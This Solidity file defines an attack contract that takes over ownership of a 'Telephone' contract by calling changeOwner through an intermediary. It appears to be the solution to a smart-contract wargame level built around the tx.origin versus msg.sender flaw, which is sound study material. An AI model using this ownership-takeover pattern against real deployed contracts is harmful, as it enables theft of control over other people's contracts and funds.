// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

interface ITelephone {
    function changeOwner(address _owner) external payable;
    function owner() external view returns (address);
}

contract TelephoneAttack {
    
    function attack(address target) external {

        ITelephone telephoneContract = ITelephone(target);

        telephoneContract.changeOwner(msg.sender);
        console.log("Le msg.sender dans le contrat attaquant est :", msg.sender);
    }
}